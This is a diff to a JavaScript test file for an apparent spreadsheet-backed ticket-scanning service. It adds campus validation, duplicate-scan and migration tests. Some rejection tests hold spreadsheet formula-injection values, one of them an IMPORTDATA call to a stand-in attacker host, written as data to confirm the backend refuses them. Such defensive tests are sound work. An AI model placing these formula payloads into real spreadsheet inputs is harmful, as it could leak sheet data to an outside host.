@@ -6,6 +6,7 @@ const vm = require('node:vm');
 const VALID_TOKEN = 'a'.repeat(64);
 const UNKNOWN_TOKEN = 'c'.repeat(64);
 const INACTIVE_TOKEN = 'b'.repeat(64);
+const CONFIGURED_TOKEN = 'd'.repeat(64);
 const SCAN_SPREADSHEET_ID = '1FairScanWorkbookIdForAuthorizationTests';
 
 function sha256(value) {
@@ -123,7 +124,7 @@ class FakeSpreadsheet {
 function defaultSheets() {
   return {
     Raw_Scans: [
-      ['Timestamp', 'Uni_ID', 'UUID']
+      ['Timestamp', 'Uni_ID', 'UUID', 'Campus']
     ],
     participant_url: [
       ['Participant_Name', 'Participant_ID', 'Token_Hash', 'Active', 'Scanner_URL'],
@@ -140,12 +141,21 @@ function defaultSheets() {
         sha256(INACTIVE_TOKEN),
         false,
         `https://scanner.example/?uni=inactive#token=${INACTIVE_TOKEN}`
+      ],
+      [
+        'IE University',
+        'ieu',
+        sha256(CONFIGURED_TOKEN),
+        true,
+        `https://scanner.example/?uni=ieu#token=${CONFIGURED_TOKEN}`
       ]
     ],
     valid_tickets: [
       ['UUID'],
       ['A1B2C3D4'],
-      ['12345678']
+      ['12345678'],
+      ['CAMP0001'],
+      ['CAMP0002']
     ]
   };
 }
@@ -242,23 +252,18 @@ function postRequest(context, {
   participantId = 'constructor',
   token = VALID_TOKEN,
   uuid = 'A1B2C3D4',
-  timestamp = '2026-07-27T12:00:00.000Z'
+  timestamp = '2026-07-27T12:00:00.000Z',
+  campus
 } = {}) {
+  const parameter = { participant_id: participantId, token, uuid, timestamp };
+  if (campus !== undefined) {
+    parameter.campus = campus;
+  }
   return parseResponse(context.doPost({
-    parameter: {
-      participant_id: participantId,
-      token,
-      uuid,
-      timestamp
-    },
+    parameter,
     postData: {
       type: 'application/x-www-form-urlencoded',
-      contents: new URLSearchParams({
-        participant_id: participantId,
-        token,
-        uuid,
-        timestamp
-      }).toString()
+      contents: new URLSearchParams(parameter).toString()
     }
   }));
 }
@@ -280,6 +285,7 @@ function postRequest(context, {
   assert.equal(rawScans.getLastRow(), 2);
   assert.equal(rawScans.rows[1][1], 'constructor');
   assert.equal(rawScans.rows[1][2], 'A1B2C3D4');
+  assert.equal(rawScans.rows[1][3], '', 'unconfigured institution must get a blank Campus cell');
   assert.equal(lockReleases(), 1);
   assert.deepEqual(
     lockEvents(),
@@ -304,7 +310,13 @@ for (const [label, request, expectedCode] of [
   ['short token', { token: 'abc' }, 'invalid_request'],
   ['lowercase ticket', { uuid: 'a1b2c3d4' }, 'invalid_request'],
   ['formula participant', { participantId: '=IMPORTDATA' }, 'invalid_request'],
-  ['invalid timestamp', { timestamp: 'not-a-date' }, 'invalid_request']
+  ['invalid timestamp', { timestamp: 'not-a-date' }, 'invalid_request'],
+  ['unconfigured institution cannot accept an arbitrary campus', { campus: 'Anywhere' }, 'invalid_campus'],
+  [
+    'participant-ID tampering is still unauthorized when campus is present',
+    { participantId: 'sommet', token: CONFIGURED_TOKEN, campus: 'Madrid' },
+    'unauthorized'
+  ]
 ]) {
   const { context, spreadsheet } = createEnvironment();
   const response = postRequest(context, request);
@@ -326,6 +338,91 @@ for (const [label, request, expectedCode] of [
   assert.deepEqual(response, { result: 'error', code: 'server_error' });
   assert.equal(loggedErrors.length, 1);
   assert.doesNotMatch(JSON.stringify(response), new RegExp(VALID_TOKEN));
+}
+
+// --- Campus Intent Capture ---
+
+{
+  const { context, spreadsheet } = createEnvironment();
+  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
+
+  assert.deepEqual(
+    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001', campus: 'Madrid' }),
+    { result: 'success', duplicate: false },
+    'a valid configured campus must be accepted'
+  );
+  assert.equal(rawScans.rows[1][3], 'Madrid');
+
+  assert.deepEqual(
+    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0002', campus: 'Undecided' }),
+    { result: 'success', duplicate: false },
+    'Undecided must be accepted'
+  );
+  assert.equal(rawScans.rows[2][3], 'Undecided');
+}
+
+{
+  // A configured institution's older queued scans may legitimately omit
+  // campus entirely; the backend must still accept them.
+  const { context, spreadsheet } = createEnvironment();
+  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
+
+  assert.deepEqual(
+    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001' }),
+    { result: 'success', duplicate: false }
+  );
+  assert.equal(rawScans.rows[1][3], '');
+}
+
+for (const [label, campus] of [
+  ['a campus outside the participant allowlist', 'Barcelona'],
+  ['an arbitrary formula-shaped campus value', '=IMPORTDATA("https://attacker.example")']
+]) {
+  const { context, spreadsheet } = createEnvironment();
+  const response = postRequest(context, {
+    participantId: 'ieu',
+    token: CONFIGURED_TOKEN,
+    uuid: 'CAMP0001',
+    campus
+  });
+  assert.deepEqual(response, { result: 'error', code: 'invalid_campus' }, label);
+  assert.equal(
+    spreadsheet.getSheetByName('Raw_Scans').getLastRow(),
+    1,
+    `${label} must not append a row`
+  );
+}
+
+{
+  // Campus validation is scoped to the authenticated participant: a value
+  // valid for one institution must not be accepted for another.
+  const { context, spreadsheet } = createEnvironment();
+  const response = postRequest(context, {
+    participantId: 'constructor',
+    token: VALID_TOKEN,
+    campus: 'Madrid'
+  });
+  assert.deepEqual(response, { result: 'error', code: 'invalid_campus' });
+  assert.equal(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 1);
+}
+
+{
+  // Duplicate handling remains idempotent and campus-aware: a repeat scan
+  // for the same institution + UUID must not create a second row, even
+  // when a (potentially different) campus value is supplied.
+  const { context, spreadsheet } = createEnvironment();
+  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
+
+  postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001', campus: 'Madrid' });
+  const duplicateResponse = postRequest(context, {
+    participantId: 'ieu',
+    token: CONFIGURED_TOKEN,
+    uuid: 'CAMP0001',
+    campus: 'Segovia'
+  });
+  assert.deepEqual(duplicateResponse, { result: 'success', duplicate: true });
+  assert.equal(rawScans.getLastRow(), 2, 'duplicate scans must not append a second row');
+  assert.equal(rawScans.rows[1][3], 'Madrid', 'the original accepted campus must be unchanged');
 }
 
 {
@@ -359,6 +456,52 @@ for (const [label, request, expectedCode] of [
   assert.equal(
     harness.scriptProperties.get('SCAN_SPREADSHEET_ID'),
     SCAN_SPREADSHEET_ID
+  );
+}
+
+// --- Safe Raw_Scans migration helper ---
+
+{
+  // A pre-migration production sheet: only the legacy three headers, with
+  // existing rows that must be left untouched.
+  const sheets = {
+    Raw_Scans: [
+      ['Timestamp', 'Uni_ID', 'UUID'],
+      ['2026-01-01T00:00:00.000Z', 'constructor', 'A1B2C3D4']
+    ],
+    participant_url: defaultSheets().participant_url,
+    valid_tickets: defaultSheets().valid_tickets
+  };
+  const harness = createEnvironment(sheets);
+  const rawScans = harness.spreadsheet.getSheetByName('Raw_Scans');
+
+  const result = harness.context.migrateRawScansAddCampusColumn();
+  assert.equal(result.migrated, true);
+  assert.equal(result.alreadyPresent, false);
+  assert.equal(rawScans.rows[0][3], 'Campus');
+  assert.deepEqual(
+    rawScans.rows[1],
+    ['2026-01-01T00:00:00.000Z', 'constructor', 'A1B2C3D4'],
+    'existing rows must not be modified'
+  );
+
+  const secondRun = harness.context.migrateRawScansAddCampusColumn();
+  assert.equal(secondRun.migrated, false);
+  assert.equal(secondRun.alreadyPresent, true);
+}
+
+{
+  const sheets = {
+    Raw_Scans: [
+      ['Timestamp', 'Uni_ID', 'Ticket']
+    ],
+    participant_url: defaultSheets().participant_url,
+    valid_tickets: defaultSheets().valid_tickets
+  };
+  const harness = createEnvironment(sheets);
+  assert.throws(
+    () => harness.context.migrateRawScansAddCampusColumn(),
+    /does not have the expected Timestamp, Uni_ID, UUID headers/
   );
 }
 
